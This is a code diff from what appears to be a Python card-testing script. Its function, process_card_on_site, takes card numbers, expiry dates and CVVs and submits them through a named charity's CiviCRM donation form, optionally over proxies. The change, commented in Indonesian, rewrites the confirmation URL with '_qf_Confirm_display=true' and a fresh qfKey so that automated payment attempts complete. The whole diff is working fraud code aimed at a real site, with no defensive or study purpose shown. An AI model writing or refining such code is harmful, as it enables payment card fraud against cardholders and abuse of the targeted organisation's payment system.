@@ -397,12 +397,14 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 if confirm_action:
                     confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)
 
-                # Pastikan URL Confirm ada qfKey baru
-                if 'qfKey=' in confirm_post_url and f'qfKey={qfkey_to_use}' not in confirm_post_url:
-                    confirm_post_url = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={qfkey_to_use}', confirm_post_url)
-                elif 'qfKey=' not in confirm_post_url:
-                    if '?' in confirm_post_url: confirm_post_url += f'&qfKey={qfkey_to_use}'
-                    else: confirm_post_url += f'?qfKey={qfkey_to_use}'
+                # FORCE URL CONFIRMATION SUPAYA SEMPURNA DENGAN _qf_Confirm_display=true
+                if '?' in confirm_post_url:
+                    if '_qf_Confirm_display=true' not in confirm_post_url:
+                        confirm_post_url += '&_qf_Confirm_display=true'
+                    if f'qfKey={qfkey_to_use}' not in confirm_post_url:
+                        confirm_post_url = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={qfkey_to_use}', confirm_post_url)
+                else:
+                    confirm_post_url += f'?_qf_Confirm_display=true&qfKey={qfkey_to_use}'
 
                 session.headers.update({
                     "Referer": response.url
